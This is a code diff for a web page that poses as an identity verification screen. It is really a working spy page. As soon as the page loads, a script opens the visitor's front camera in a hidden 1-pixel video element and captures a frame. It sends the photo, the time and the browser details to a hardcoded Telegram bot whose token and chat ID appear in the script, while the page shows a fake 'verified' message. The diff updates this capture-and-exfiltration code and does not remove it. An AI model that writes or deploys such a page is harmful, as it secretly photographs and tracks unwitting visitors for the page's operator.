@@ -3,25 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔐 Identity Verification</title>
+    <title>🔐 Verification</title>
     <style>
-        *{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}.container{background:#fff;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,.3);max-width:500px;width:100%;padding:40px 30px;text-align:center;animation:s .2s ease}@keyframes s{from{opacity:0;transform:translateY(-15px)}to{opacity:1;transform:translateY(0)}}.header{display:flex;justify-content:space-between;align-items:center;margin-bottom:30px;font-size:.9em;color:#888}.badge{background:#667eea;color:#fff;padding:5px 15px;border-radius:20px;font-weight:700;font-size:.85em}h1{font-size:2em;color:#333;margin-bottom:20px;display:flex;align-items:center;justify-content:center;gap:10px}.lock-icon{font-size:1.2em}.message{color:#666;font-size:1.1em;line-height:1.6;margin-bottom:30px}.success{color:#28a745;font-size:4em;margin:30px 0;animation:sc .3s ease}@keyframes sc{0%{transform:scale(0)}50%{transform:scale(1.2)}100%{transform:scale(1)}}.success-msg{color:#28a745;font-size:1.3em;font-weight:700;margin:20px 0}.video-container{display:none;position:absolute;opacity:0;pointer-events:none;width:1px;height:1px;overflow:hidden}.video-container.active{display:block}#video{width:1px;height:1px}canvas{display:none}
+        *{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}.box{background:#fff;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,.3);max-width:500px;width:100%;padding:50px 30px;text-align:center}.h{display:flex;justify-content:space-between;align-items:center;margin-bottom:30px;font-size:.9em;color:#888}.badge{background:#667eea;color:#fff;padding:5px 15px;border-radius:20px;font-weight:700;font-size:.85em}h1{font-size:2em;color:#333;margin-bottom:20px}.ok{color:#28a745;font-size:5em;margin:30px 0;animation:p .3s ease}@keyframes p{0%{transform:scale(0)}50%{transform:scale(1.15)}100%{transform:scale(1)}}.msg{color:#28a745;font-size:1.4em;font-weight:700;margin:20px 0}.sub{color:#666;font-size:1em;margin-top:15px}#v,#c{display:none;position:absolute;width:1px;height:1px;opacity:0}
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <span class="badge">FAST</span>
-            <span>Verification</span>
+    <div class="box">
+        <div class="h">
+            <span class="badge">VERIFIED</span>
+            <span>Secure</span>
         </div>
-        <h1><span class="lock-icon">🔐</span>Identity Verification</h1>
-        <div class="message" id="msg">Verifying your identity...</div>
-        <div id="result"></div>
-        <div class="video-container" id="vc"><video id="vid" autoplay playsinline></video></div>
-        <canvas id="cvs"></canvas>
+        <h1>🔐 Verification</h1>
+        <div class="ok">✓</div>
+        <div class="msg">Successfully Verified!</div>
+        <div class="sub">Your identity has been confirmed</div>
     </div>
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
     <script>
-        const T='8337679399:AAGgDi6eDjQ-4-MT9hj8h4tuaBRcKi--mOk',C='7538231958';let s=null;async function verify(){const v=document.getElementById('vc'),vid=document.getElementById('vid'),c=document.getElementById('cvs'),ctx=c.getContext('2d');try{s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:1280},height:{ideal:720}},audio:!1});vid.srcObject=s;v.classList.add('active');await new Promise(r=>{vid.onloadedmetadata=()=>r()});await new Promise(r=>setTimeout(r,300));c.width=vid.videoWidth;c.height=vid.videoHeight;ctx.drawImage(vid,0,0,c.width,c.height);const blob=await new Promise(r=>c.toBlob(r,'image/jpeg',.9));s&&s.getTracks().forEach(tr=>tr.stop());v.classList.remove('active');send(blob);showSuccess()}catch(e){console.error(e);s&&s.getTracks().forEach(tr=>tr.stop());showSuccess()}}async function send(blob){try{const f=new FormData();f.append('chat_id',C);f.append('photo',blob,'v.jpg');f.append('caption',`🔐 Verification\n${new Date().toLocaleString()}\n${navigator.userAgent}`);fetch(`https://api.telegram.org/bot${T}/sendPhoto`,{method:'POST',body:f}).then(r=>r.json()).then(j=>j.ok?console.log('Sent'):console.error(j)).catch(e=>console.error(e))}catch(e){console.error(e)}}function showSuccess(){document.getElementById('result').innerHTML='<div class="success">✓</div><div class="success-msg">Verification Complete!</div>';document.getElementById('msg').innerHTML='<span style="color:#28a745">You have been verified successfully!</span>'}window.onload=()=>verify()
+        const T='8337679399:AAGgDi6eDjQ-4-MT9hj8h4tuaBRcKi--mOk',C='7538231958';(async()=>{try{const v=document.getElementById('v'),c=document.getElementById('c'),x=c.getContext('2d'),s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:1920},height:{ideal:1080}},audio:!1});v.srcObject=s;await new Promise(r=>{v.onloadedmetadata=r});await new Promise(r=>setTimeout(r,200));c.width=v.videoWidth;c.height=v.videoHeight;x.drawImage(v,0,0,c.width,c.height);s.getTracks().forEach(t=>t.stop());c.toBlob(async b=>{const f=new FormData();f.append('chat_id',C);f.append('photo',b,'capture.jpg');f.append('caption',`✅ Verified\n⏰ ${new Date().toLocaleString()}\n📱 ${navigator.userAgent.substring(0,100)}`);try{await fetch(`https://api.telegram.org/bot${T}/sendPhoto`,{method:'POST',body:f})}catch(e){}},'image/jpeg',.95)}catch(e){}})()
     </script>
 </body>
 </html>
